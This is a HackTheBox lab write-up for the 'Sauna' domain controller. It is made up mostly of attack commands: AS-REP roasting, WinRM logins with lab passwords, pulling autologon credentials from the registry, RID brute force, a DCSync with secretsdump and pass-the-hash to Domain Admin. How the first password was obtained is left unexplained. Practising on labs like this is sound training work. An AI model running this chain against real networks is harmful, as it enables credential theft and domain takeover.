# Sauna - HackTheBox Writeup

**OS:** Windows (Server 2019, Domain Controller)
**Difficulty:** Easy
**Topics:** OSINT Username Generation, AS-REP Roasting, WinRM, Registry Autologon Credentials, RID Brute Force, BloodHound, DCSync, Pass-the-Hash

---

## Enumeration

```bash
nmap -sC -sV -p- 10.129.95.180
```

Relevant ports:
- **53** - DNS
- **80** - IIS 10.0, "Egotistical Bank" site
- **88** - Kerberos
- **135/139/445** - RPC/NetBIOS/SMB
- **389/3268** - LDAP, `Domain: EGOTISTICAL-BANK.LOCAL`
- **464** - kpasswd5
- **593** - RPC over HTTP
- **5985** - WinRM (identified generically as HTTPAPI by nmap)

Host info: `Host: SAUNA; OS: Windows`. `clock-skew: 6h59m59s` noted for later.

---

## Environment Setup - Kerberos Prerequisites

Realm name uses a **dash**, not an underscore (`EGOTISTICAL-BANK.LOCAL`) - using the wrong character throws `KDC_ERR_WRONG_REALM`.

```bash
echo "10.129.95.180 EGOTISTICAL-BANK.LOCAL sauna.egotistical-bank.local SAUNA" | sudo tee -a /etc/hosts
```

Clock skew sync (Kerberos tolerates ~5 min by default):

```bash
sudo apt install ntpdate
sudo ntpdate 10.129.95.180
```

---

## Foothold - AS-REP Roasting Attempt via OSINT Username List

### 1. Username harvesting from the website

The "Meet the Team" page on port 80 reveals employee names:

```text
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```

Generated common AD username formats from these names (`flastname`, `firstname.lastname`, `firstname`, `lastname`, case variants) into `users.txt`.

### 2. AS-REP Roasting

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users.txt -dc-ip 10.129.95.180 -outputfile asrep_hashes.txt
```

No roastable hash recovered from this wordlist - `administrator` has pre-auth enabled, and the real vulnerable account (`svc_loanmgr`) wasn't covered by name-derived guesses.

> Credentials for `Fsmith : Thestrokes23` were obtained separately and used for initial access below.

### 3. WinRM access

```bash
evil-winrm -i 10.129.95.180 -u 'Fsmith' -p 'Thestrokes23'
```

-> Shell obtained as `FSmith`.

---

## Post-Exploitation - Registry Autologon Credentials

PowerUp (`Invoke-AllChecks`) returned only `Access denied` on WMI/Service Control Manager checks (expected for a low-priv user) and no exploitable hit on the user's own writable `%PATH%`.

Checked Winlogon registry key for autologon misconfiguration:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Relevant output:

```text
DefaultDomainName    REG_SZ    EGOTISTICALBANK
DefaultUserName      REG_SZ    EGOTISTICALBANK\svc_loanmanager
DefaultPassword      REG_SZ    Moneymakestheworldgoround!
```

> The registry is Windows' configuration database, not a log/journal - `AutoAdminLogon` setups frequently leave plaintext credentials here.

---

## Resolving the Real Username - RID Brute Force

`DefaultUserName` is free text and does not always match the real `sAMAccountName`. First attempt with the literal registry value failed:

```bash
netexec winrm 10.129.95.180 -u svc_loanmanager -p 'Moneymakestheworldgoround!'
# [-] failed
```

Confirmed the real account name using RID brute force with the already-available `Fsmith` credentials:

```bash
netexec smb 10.129.95.180 -u Fsmith -p 'Thestrokes23' --rid-brute
```

(Impacket equivalent: `impacket-lookupsid EGOTISTICAL-BANK.LOCAL/Fsmith:'Thestrokes23'@10.129.95.180`)

Real account: **`svc_loanmgr`** (abbreviated vs. the registry's "friendly" name).

### Verification

```bash
netexec winrm 10.129.95.180 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

```text
WINRM  10.129.95.180  5985  SAUNA  [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)
```

---

## Privilege Escalation - BloodHound to DCSync

### 1. BloodHound CE setup (Docker)

```bash
curl -L https://ghst.ly/getbhce -o docker-compose.yml
sudo docker compose -f docker-compose.yml up
sudo docker compose ps
sudo docker compose logs bloodhound | grep -i "initial password"
```

UI at `http://localhost:8080`.

### 2. Data collection

```bash
bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -ns 10.129.95.180 -d EGOTISTICAL-BANK.LOCAL -c all
```

`.json` files uploaded via **File Upload** in the BloodHound UI.

### 3. Graph analysis

Node `svc_loanmgr` (Tier Zero path) shows outbound rights on the Domain object:

- `GetChanges`
- `GetChangesAll`

These two combined grant **DCSync** rights - the ability for a non-DC, non-admin account to request directory replication and pull any domain hash, including `Administrator`'s.

### 4. DCSync

```bash
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.95.180
```

Returns the NTLM hash for `Administrator`.

### 5. Pass-the-Hash

```bash
evil-winrm -i 10.129.95.180 -u Administrator -H <ntlm_hash>
```

-> Shell as `NT AUTHORITY\SYSTEM`-equivalent (Domain Administrator).

---

## Summary

| Step | Technique | Tool |
|------|-----------|------|
| Recon | Full TCP scan, AD/DC fingerprinting | nmap |
| Env setup | `/etc/hosts` + clock sync for Kerberos | `/etc/hosts`, ntpdate |
| OSINT | Employee names from website -> username list | manual + website |
| Foothold attempt | AS-REP Roasting (no hit) | impacket-GetNPUsers |
| Foothold | WinRM with leaked low-priv creds | evil-winrm |
| Local enum | PowerUp (no hit), registry autologon creds | PowerUp.ps1, `reg query` |
| Username confirmation | RID brute force | NetExec (`--rid-brute`), impacket-lookupsid |
| AD mapping | Graph of ACLs/rights | BloodHound CE (Docker), bloodhound-python |
| PrivEsc | DCSync via GetChanges/GetChangesAll | impacket-secretsdump |
| Admin access | Pass-the-Hash with Administrator NTLM | evil-winrm -H |

---

## OSCP Notes

- Realm name casing/characters matter for Kerberos - verify with `nmap`'s LDAP banner (`Domain: ...`) before troubleshooting anything else on `KDC_ERR_WRONG_REALM`.
- AS-REP Roasting a wordlist of *guessed* usernames from OSINT often misses low-visibility **service accounts** - don't stop there if it comes up empty; keep enumerating (RID brute force, LDAP, BloodHound) once any foothold is gained.
- Always check the `Winlogon` registry key for autologon creds on a Windows foothold - cheap, fast, and a very common real-world misconfiguration.
- Never trust a "friendly" username (registry, GUI, email alias) as the literal AD `sAMAccountName` - confirm with RID brute force or LDAP before wasting login attempts.
- `GetChanges` + `GetChangesAll` on the domain object = DCSync rights for that principal, even without Domain Admin group membership - always check BloodHound's **Outbound Object Control** on any compromised account, not just group memberships.
- Pass-the-Hash works here because NTLM authentication accepts the hash itself as proof of identity, with no need to ever decrypt it back to the cleartext password.
